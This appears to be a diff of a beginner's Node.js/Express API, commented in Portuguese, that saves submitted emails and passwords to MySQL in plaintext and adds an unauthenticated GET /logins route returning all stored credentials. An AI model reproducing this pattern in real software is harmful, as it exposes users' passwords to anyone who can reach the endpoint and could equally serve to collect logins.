@@ -17,33 +17,46 @@ const db = mysql.createConnection({
 
 db.connect((err) => {
     if (err) {
-        console.log("❌ Erro ao conectar ao banco:", err);
+        console.log("❌ Erro ao conectar ao banco:", err.message);
         return;
     }
-    console.log("✅ Banco conectado!");
+    console.log("✅ Conexão bem-sucedida com o MySQL!");
 });
 
-// Rota para salvar login
+// Rota para salvar login (ESSA É A SUA ORIGINAL)
 app.post("/salvar-login", (req, res) => {
     const { email, senha } = req.body;
 
     if (!email || !senha) {
-        return res.status(400).send("Email e senha são obrigatórios.");
+        return res.json({ ok: false, mensagem: "Email e senha são obrigatórios." });
     }
 
     const sql = "INSERT INTO logins (email, senha) VALUES (?, ?)";
-
     db.query(sql, [email, senha], (err, result) => {
         if (err) {
-            console.log("❌ Erro ao salvar:", err);
-            return res.status(500).send("Erro ao salvar login.");
+            console.log("❌ Erro ao salvar:", err.message);
+            return res.json({ ok: false, mensagem: "Erro ao salvar login." });
         }
 
-        res.send("Login salvo com sucesso!");
+        return res.json({ ok: true, mensagem: "Login salvo com sucesso!" });
+    });
+});
+
+// Rota para listar logins salvos
+app.get("/logins", (req, res) => {
+    const sql = "SELECT * FROM logins";
+
+    db.query(sql, (err, results) => {
+        if (err) {
+            console.log("❌ Erro ao buscar logins:", err.message);
+            return res.json({ ok: false, mensagem: "Erro ao buscar logins." });
+        }
+
+        return res.json({ ok: true, logins: results });
     });
 });
 
 // Inicializando servidor
 app.listen(3000, () => {
-    console.log("🚀 Servidor rodando em http://localhost:3000");
+    console.log("🚀 API rodando em http://localhost:3000");
 });
